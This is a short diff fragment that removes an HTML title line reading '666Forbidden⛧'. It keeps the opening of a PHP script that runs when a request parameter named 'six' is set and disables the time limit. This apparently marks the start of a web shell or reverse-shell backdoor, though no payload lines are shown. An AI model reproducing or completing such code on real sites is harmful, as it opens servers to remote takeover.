@@ -1,4 +1,3 @@
-<html><head><title>666Forbidden⛧</title></head><body><h1>666Forbidden⛧</h1>
 <?php if(isset($_REQUEST['six'])){
 set_time_limit (0);
 $VERSION = "1.0";
